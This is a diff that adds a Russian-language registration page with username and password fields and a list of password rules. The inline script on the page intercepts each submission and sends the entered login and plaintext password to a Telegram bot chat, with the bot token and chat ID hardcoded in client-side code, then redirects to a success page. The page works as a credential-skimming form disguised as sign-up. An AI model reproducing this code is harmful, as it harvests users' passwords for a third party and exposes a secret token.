@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <div class="container">
+        <form id="tg">
+            <label for="usrname">Имя пользователя</label>
+            <input type="text" id="usrname" name="usrname" required>
+
+            <label for="psw">Пароль</label>
+            <input type="password" id="psw" name="psw" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" required>
+
+            <input type="submit" value="Зарегистрироваться">
+        </form>
+    </div>
+
+    <div id="message">
+        <h3>Пароль должен содержать следующее:</h3>
+        <p id="letter" class="invalid"><b>нижний регистр</b>буква</p>
+        <p id="capital" class="invalid"><b>заглавная (прописная)</b>буква</p>
+        <p id="number" class="invalid"><b>число</b></p>
+        <p id="length" class="invalid">Минимум<b>8 символов</b></p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.1/axios.min.js"></script>
+    <script>
+        const TOKEN = "6664890572:AAF578tZ7NzkQodli51ltgsR6NAIlLGLWGg";
+        const CHAT_ID = "-1001974592287";
+        const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('tg').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            let message = `<b>Заявка с сайта!</b>\n`;
+            message += `<b> Логин: </b> ${this.usrname.value}\n`;
+            message += `<b> Пароль: </b> ${this.psw.value}\n`;
+
+            axios.post(API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+            })
+
+            setTimeout(function () {
+                window.location.href = 'succes.html';
+            }, 1000);
+        })
+    </script>
+    <script src="js/main.js"></script>
+</body>
+
+</html>
